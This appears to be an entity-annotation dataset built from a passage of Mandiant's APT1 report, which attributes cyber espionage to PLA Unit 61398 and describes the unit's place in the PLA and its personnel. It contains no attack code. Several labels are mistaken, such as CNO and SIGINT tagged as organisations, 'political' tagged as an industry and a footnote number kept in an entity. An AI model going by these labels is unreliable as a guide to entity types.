Mandiant_APT1_Report," is providing the following: 

»− Digital delivery of over 3,000 ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," indicators, such as domain names, IP addresses, and MD5 hashes of 
malware.

»− Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s 
arsenal of digital weapons. 

»− Thirteen (13) X.509 encryption certificates used by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,".

»− A compilation of videos showing actual attacker sessions and their intrusion activities.

»» While existing customers of ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,"’s enterprise-level products, ",O
Mandiant_APT1_Report,Mandiant Managed Defense,software
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Mandiant Intelligent Response,software
Mandiant_APT1_Report,"®, have had prior access to these ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," Indicators, we are also making them available for use 
with ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report,"™, our free host-based investigative tool. ",O
Mandiant_APT1_Report,RedLine,software
Mandiant_APT1_Report," can be downloaded at http://www.mandiant.com/
resources/download/redline.

http://www.mandiant.com/products/mcirt-managed-defense/
http://www.mandiant.com/products/platform/
http://www.mandiant.com/products/platform/
http://www.mandiant.com/resources/download/redline
http://www.mandiant.com/resources/download/redline


",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 6 www.mandiant.com

Conclusion

The sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identified 
group based in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, leaves little doubt about the organization behind ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". We believe the totality of the evidence 
we provide in this document bolsters the claim that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, is ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,". However, we admit there is one other unlikely 
possibility:

A secret, resourced organization full of mainland Chinese speakers with direct access to ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"-based 
",O
Mandiant_APT1_Report,telecommunications,industry
Mandiant_APT1_Report," infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign 
right outside of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s gates, performing tasks similar to ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s known mission.

Why We Are Exposing ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 

The decision to publish a significant part of our intelligence about ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," was a painstaking one. What started as 
a “what if” discussion about our traditional non-disclosure policy quickly turned into the realization that the positive 
impact resulting from our decision to expose ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," outweighed the risk to our ability to collect intelligence on this 
particular ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, group. It is time to acknowledge the threat is originating in ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,", and we wanted to do our part to arm 
and prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing 
link in publicly understanding the landscape of ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, cyber espionage. Without establishing a solid connection to ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,", 
there will always be room for observers to dismiss ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," actions as uncoordinated, solely criminal in nature, or peripheral 
to larger national security and global economic concerns. We hope that this report will lead to increased understanding 
and coordinated action in countering ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," network breaches.

At the same time, there are downsides to publishing all of this information publicly. Many of the techniques and 
technologies described in this report are vastly more effective when attackers are not aware of them. Additionally, 
publishing certain kinds of indicators dramatically shortens their lifespan. When ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," changes their techniques 
after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It 
is our sincere hope, however, that this report can temporarily increase the costs of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s operations and impede 
their progress in a meaningful way.

We are acutely aware of the risk this report poses for us. We expect reprisals from ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," as well as an onslaught of 
criticism. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 7 www.mandiant.com

",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s CoMPuter network 
oPeratIons taskInG to ",O
Mandiant_APT1_Report,PLa unIt 61398,threat_actor
Mandiant_APT1_Report," (61398部队 )

Our research and observations indicate that ",O
Mandiant_APT1_Report,the Communist Party,org
Mandiant_APT1_Report," of  
",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,",中国共产党) is tasking the ",O
Mandiant_APT1_Report,Chinese People’s Liberation Army,org
Mandiant_APT1_Report,"  
(",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,",中国人民解放军) to commit systematic cyber espionage and data theft 
against organizations around the world. This section provides photos and details 
of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," facilities, Chinese references discussing the unit’s training and 
coursework requirements, and internal Chinese communications documenting 
the nature of the unit’s relationship with at least one state-owned enterprise. 
These details will be particularly relevant when we discuss ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s expertise, 
personnel, location, and infrastructure, which parallel those of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,".

",O
Mandiant_APT1_Report,the Communist Party,org
Mandiant_APT1_Report, of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"

The ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,’s cyber command is fully institutionalized within the ,O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report, and able to draw upon the resources of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s state-
owned enterprises to support its operations. The ",O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report, is the ultimate authority in Mainland ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"; unlike in Western 
societies, in which political parties are subordinate to the government, the military and government in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," are 
subordinate to the ",O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,". In fact, the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, reports directly to the ,O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,Central Military Commission,org
Mandiant_APT1_Report," (CMC, 中央军事委
员会).6 This means that any enterprise cyber espionage campaign within the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report," is occurring at the direction of senior 
members of the ",O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,".

We believe that the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,’s strategic cyber command is situated in the ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report,",总参谋
部), specifically its 3rd Department (总参三部).7 The ",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report, is the most senior ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, department. Similar to the ,O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," 
",O
Mandiant_APT1_Report,Joint Chiefs of Staff,org
Mandiant_APT1_Report,", the ",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report, establishes doctrine and provides operational guidance for the ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,. Within the ,O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report,", the 
3rd Department has a combined focus on signals intelligence, foreign language proficiency, and defense information 

6 ",O
Mandiant_APT1_Report,James C. Mulvenon,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Andrew N. D. Yang,identity
Mandiant_APT1_Report,", editors, ",O
Mandiant_APT1_Report,The People’s Liberation Army,org
Mandiant_APT1_Report," as Organization: Reference Volume v1.0, (",O
Mandiant_APT1_Report,Santa Monica,city
Mandiant_APT1_Report,", CA: ",O
Mandiant_APT1_Report,RAND Corporation,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,2002,timestamp
Mandiant_APT1_Report,"), 96, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
7 ",O
Mandiant_APT1_Report,Bryan Krekel,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Patton Adams,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,George Bakos,identity
Mandiant_APT1_Report,", “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations 
and Cyber Espionage,” Prepared for the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report,-,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, Economic and Security Review Commission by ,O
Mandiant_APT1_Report,Northrop Grumman Corp,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"): 10, http://www.
uscc.gov/RFP/2012/USCC%20Report_Chinese_CapabilitiesforComputer_NetworkOperationsandCyberEspionage.pdf, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 8 www.mandiant.com

systems.8 It is estimated to have 130,0009 personnel divided between 12 bureaus (局), three research institutes, and 
16 regional and functional bureaus.10 We believe that the ",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 3rd Department, 2nd Bureau (总参三部二局), is the 
",O
Mandiant_APT1_Report,APT group,threat_actor
Mandiant_APT1_Report, that we are tracking as ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". Figure 1 shows how close the 2nd Bureau sits to the highest levels of the 
",O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report,". At this level, the 2nd Bureau also sits atop a large-scale organization of subordinate offices.

",O
Mandiant_APT1_Report,Communist Party,org
Mandiant_APT1_Report, of ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"
(",O
Mandiant_APT1_Report,Central Military Commission,org
Mandiant_APT1_Report,",

)

",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report,"
( )

",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Political Department,org
Mandiant_APT1_Report,"
( )

",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Logistics Department,org
Mandiant_APT1_Report,"
( )

",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Armaments Department,org
Mandiant_APT1_Report,"
( )

",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 1st Department 
( )
Operations

",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 2nd Department
( )
Intelligence

",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 3rd Department
( )

",O
Mandiant_APT1_Report,SIGINT,org
Mandiant_APT1_Report,/,O
Mandiant_APT1_Report,CNO,org
Mandiant_APT1_Report,"

7 Military Regions
",O
Mandiant_APT1_Report,PLA Airforce,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,PLAA,org
Mandiant_APT1_Report,")
",O
Mandiant_APT1_Report,PLA Navy,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,PLAN,org
Mandiant_APT1_Report,")

1st Bureau
(总参三部一局)

2nd Bureau
(总参三部二局)

",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"

12 Total Bureaus
3 Research Institutes

FIGure 1: ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,’s position within the ,O
Mandiant_APT1_Report,PLa11,org
Mandiant_APT1_Report," 

8 The 3rd department’s mission is roughly a blend of the missions assigned to the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,National Security Agency,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,the Defense Language Institute,org
Mandiant_APT1_Report,", 
and parts of ",O
Mandiant_APT1_Report,the Defense Information Systems Agency,org
Mandiant_APT1_Report,".
9 ",O
Mandiant_APT1_Report,Bryan Krekel,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Patton Adams,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,George Bakos,identity
Mandiant_APT1_Report,", “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations 
and Cyber Espionage,” Prepared for the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report,-,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, Economic and Security Review Commission by ,O
Mandiant_APT1_Report,Northrop Grumman Corp,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"): 47, http://www.
uscc.gov/RFP/2012/USCC%20Report_Chinese_CapabilitiesforComputer_NetworkOperationsandCyberEspionage.pdf, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
10 ",O
Mandiant_APT1_Report,Ian Easton,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Mark A. Stokes,identity
Mandiant_APT1_Report,", “",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,’s Electronic Intelligence Satellite Developments: Implications for ,O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," Air and Naval Operations,” ",O
Mandiant_APT1_Report,Project 2049 Institute,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report,"): 5, http://project2049.net/documents/",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"_electronic_intelligence_elint_satellite_developments_easton_stokes.pdf, accessed 
",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
11 ",O
Mandiant_APT1_Report,James C. Mulvenon,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Andrew N. D. Yang,identity
Mandiant_APT1_Report,", editors, The ",O
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report," as Organization: Reference Volume v1.0, (",O
Mandiant_APT1_Report,Santa Monica,city
Mandiant_APT1_Report,", CA: 
",O
Mandiant_APT1_Report,RAND Corporation,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,2002,timestamp
Mandiant_APT1_Report,"), 96, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 9 www.mandiant.com

Inferring the Computer Network 
Operations Mission and Capabilities 
of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," (61398部队) 

Publicly available references confirm that the 
",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report,"’s 3rd Department, 2nd Bureau, is 
",O
Mandiant_APT1_Report,Military Unit Cover Designator,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,MUCD,org
Mandiant_APT1_Report,") 61398, 
more commonly known as ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,".12 They 
also clearly indicate that ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," is tasked 
with computer network operations (",O
Mandiant_APT1_Report,CNO,org
Mandiant_APT1_Report,").13 
",O
Mandiant_APT1_Report,The Project 2049 Institute,org
Mandiant_APT1_Report, reported in ,O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report," 
that ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," “appears to function as the 
Third Department`s premier entity targeting the 
",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report,", most likely focusing 
on ",O
Mandiant_APT1_Report,political,industry
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,economic,industry
Mandiant_APT1_Report,", and military-related 
intelligence.”14 Our research supports this and 
also suggests ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,CNO,org
Mandiant_APT1_Report," activities are 
not limited to the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report,", but likely 
extend to any organization where English is the 
primary language. 

Identifying ",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 3rd Department, 2nd Bureau as ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"
The care with which the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, maintains the separation between the ,O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 3rd Department, 2nd Bureau, and the ",O
Mandiant_APT1_Report,MUCD,org
Mandiant_APT1_Report," 
61398 can be partially observed by searching the Internet for official documents from the ",O
Mandiant_APT1_Report,Chinese government,org
Mandiant_APT1_Report," that 
refer to both the 2nd Bureau and ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,". Figure 2 shows the results of one of these queries.

FIGure 2: no results found for searching for “",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report, 3rd Department 2nd Bureau” and “,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"” on any 
",O
Mandiant_APT1_Report,Chinese government,org
Mandiant_APT1_Report," websites

Despite our challenges finding a link between the ",O
Mandiant_APT1_Report,Chinese Government,org
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," online, our searches did find 
references online indicating that the ",O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 3rd Department, 2nd Bureau, is actually ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,". Specifically, ",O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report," 
indexed references to ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, in forums and resumes. Once these references were discovered by ,O
Mandiant_APT1_Report,CPC,org
Mandiant_APT1_Report," censors, 
these postings and documents were likely modified or removed from the Internet. Figure 3 shows ",O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report," search results 

12 ",O
Mandiant_APT1_Report,Mark A. Stokes,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Jenny Lin,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,L.C. Russell Hsiao,identity
Mandiant_APT1_Report,", “",O
Mandiant_APT1_Report,The Chinese People’s Liberation Army,org
Mandiant_APT1_Report," Signals Intelligence and Cyber Reconnaissance 
Infrastructure,” ",O
Mandiant_APT1_Report,Project 2049 Institute,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report,"): 8, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, 
accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
13 ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Department of Defense,org
Mandiant_APT1_Report," defines Computer Network Operations as “Comprised of computer network attack, computer network defense, and 
related computer network exploitation enabling operations. Also called ",O
Mandiant_APT1_Report,CNO,org
Mandiant_APT1_Report,". 
 • computer network attack. Actions taken through the use of computer networks to disrupt, deny, degrade, or destroy information resident in  
  computers and computer networks, or the computers and networks themselves. Also called ",O
Mandiant_APT1_Report,CNA,org
Mandiant_APT1_Report,". 
 • computer network defense. Actions taken to protect, monitor, analyze, detect, and respond to unauthorized activity within the Department of  
  Defense information systems and computer networks. Also called ",O
Mandiant_APT1_Report,CND,org
Mandiant_APT1_Report,". 
 • computer network exploitation. Enabling operations and intelligence collection capabilities conducted through the use of computer networks to  
  gather data from target or adversary automated information systems or networks. Also called ",O
Mandiant_APT1_Report,CNE,org
Mandiant_APT1_Report,".” 
",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Department of Defense,org
Mandiant_APT1_Report,", The Dictionary of Military Terms (",O
Mandiant_APT1_Report,New York,city
Mandiant_APT1_Report,: ,O
Mandiant_APT1_Report,"Skyhorse Publishing, Inc.",org
Mandiant_APT1_Report,"), 112.
14 ",O
Mandiant_APT1_Report,Mark A. Stokes,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Jenny Lin,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,L.C. Russell Hsiao,identity
Mandiant_APT1_Report,", “",O
Mandiant_APT1_Report,The Chinese People’s Liberation Army,org
Mandiant_APT1_Report," Signals Intelligence and Cyber Reconnaissance 
Infrastructure,” ",O
Mandiant_APT1_Report,Project 2049 Institute,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report,"): 8, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, 
accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".

what is a ",O
Mandiant_APT1_Report,MUCD,org
Mandiant_APT1_Report,"?
",O
Mandiant_APT1_Report,Chinese military,org
Mandiant_APT1_Report, units are given ,O
Mandiant_APT1_Report,MUCD,org
Mandiant_APT1_Report,"s, five-digit 
numerical sequences, to provide basic anonymity for the 
unit in question and as a standardized reference that 
facilitates communications and operations (e.g., “Unit 
81356 is moving to the objective,” versus “1st Battalion, 
125th Regiment, 3rd Division, 14th Group Army is 
moving to the objective”). ",O
Mandiant_APT1_Report,Military Unit Cover Designators,org
Mandiant_APT1_Report,"
are also used in official publications and on the Internet 
to refer to the unit in question. The ",O
Mandiant_APT1_Report,MUCD,org
Mandiant_APT1_Report," numbers are 
typically displayed outside a unit’s barracks, as well as on 
the unit’s clothing, flags, and stationary.

Source: The ",O
Mandiant_APT1_Report,Chinese Army,org
Mandiant_APT1_Report," Today: Tradition and Transformation 
for the 21st Century — ",O
Mandiant_APT1_Report,Dennis J. Blasko,identity
Mandiant_APT1_Report,"

http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf
http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf


",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 10 www.mandiant.com

for ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," and some responsive “hits” (note that the links that appear in these search results will likely have been 
removed by the time you read this report):

FIGure 3: ",O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report, search results that show ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," attribution “leaks”

",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s Personnel requirements
",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," appears to be actively soliciting and training English speaking personnel specializing in a wide variety 
of cyber topics. Former and current personnel from the unit have publicly alluded to these areas of emphasis. For 
example, a graduate student of covert communications, ",O
Mandiant_APT1_Report,Li Bingbing,identity
Mandiant_APT1_Report," (李兵兵), who openly acknowledged his affiliation 
with ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,", published a paper in ",O
Mandiant_APT1_Report,2010,timestamp
Mandiant_APT1_Report, that discussed embedding covert communications within ,O
Mandiant_APT1_Report,Microsoft® Word,software
Mandiant_APT1_Report," 
documents. Another example is English linguist ",O
Mandiant_APT1_Report,Wang Weizhong,identity
Mandiant_APT1_Report,"’s (王卫忠) biographical information, provided to the 
",O
Mandiant_APT1_Report,Hebei Chamber of Commerce,org
Mandiant_APT1_Report,", which describes the training he received as an English linguist while assigned to 
",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,. These and other examples that demonstrate ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s areas of expertise are listed in Table 1 below.15

taBLe 1: Chinese sources referring to the areas of expertise contained in ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,".16.17.18.19

type of expertise in ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, (部队) source Describing that expertise in ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"
Covert Communications Article in ",O
Mandiant_APT1_Report,Chinese academic journal,org
Mandiant_APT1_Report,. Second author ,O
Mandiant_APT1_Report,Li Bingbing,identity
Mandiant_APT1_Report," (李兵兵) 

references ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," as the source of his expertise on the topic.15

English Linguistics Bio of ",O
Mandiant_APT1_Report,Hebei Chamber of Commerce,org
Mandiant_APT1_Report, member ,O
Mandiant_APT1_Report,Wang Weizhong,identity
Mandiant_APT1_Report," (王卫忠). 
He describes that he received his training as an English linguist during his 
service in ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,. (Hebei is a borough in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,".)16

Operating System Internals Article in ",O
Mandiant_APT1_Report,Chinese academic journal,org
Mandiant_APT1_Report,. Second author ,O
Mandiant_APT1_Report,Yu Yunxiang,identity
Mandiant_APT1_Report," (虞云翔) 
references ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," as the source of his expertise on the topic.17

Digital Signal Processing Article in ",O
Mandiant_APT1_Report,Chinese academic journal,org
Mandiant_APT1_Report,. Second author ,O
Mandiant_APT1_Report,Peng Fei,identity
Mandiant_APT1_Report," (彭飞) 
references ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," as the source of his expertise on the topic.18

Network Security Article in ",O
Mandiant_APT1_Report,Chinese academic journal,org
Mandiant_APT1_Report,. Third author ,O
Mandiant_APT1_Report,Chen Yiqun,identity
Mandiant_APT1_Report," (陈依群) 
references ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," as the source of his expertise on the topic.19

15 ",O
Mandiant_APT1_Report,Li Bing-bing,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Wang Yan-Bo,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,Xu Ming,identity
Mandiant_APT1_Report,", “An information hiding method of ",O
Mandiant_APT1_Report,Word 2007,software
Mandiant_APT1_Report," based on image covering,” ",O
Mandiant_APT1_Report,Journal of Sichuan University,org
Mandiant_APT1_Report," 
(Natural Science Edition) 47 (",O
Mandiant_APT1_Report,2010,timestamp
Mandiant_APT1_Report,"), http://www.paper.edu.cn/journal/downCount/0490-6756(2010)S1-0031-06, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
16 ",O
Mandiant_APT1_Report,Hebei Chamber of Commerce,org
Mandiant_APT1_Report,", Bio of member ",O
Mandiant_APT1_Report,Wang Weizhong,identity
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"), http://www.hbsh.org/shej_ejsheqmsg.
aspx?mid=26&uid=06010000&aid=06, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
17 ",O
Mandiant_APT1_Report,Zeng Fan-jing,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Yu Yun-xiang,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,Chang Li,identity
Mandiant_APT1_Report,", “The Implementation of Overlay File System in Embedded Linux,” ",O
Mandiant_APT1_Report,Journal of Information Engineering University,org
Mandiant_APT1_Report, 7 (,O
Mandiant_APT1_Report,2006,timestamp
Mandiant_APT1_Report,"), http://file.lw23.com/9/98/984/98401889-9da6-4c38-b9d2-5a5202fd1a33.pdf, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
18 ",O
Mandiant_APT1_Report,Zhao Ji-yong,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Peng Fei,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,Geng Chang-suo,identity
Mandiant_APT1_Report,", “ADC’s Performance and Selection Method of Sampling Number of Bits,” ",O
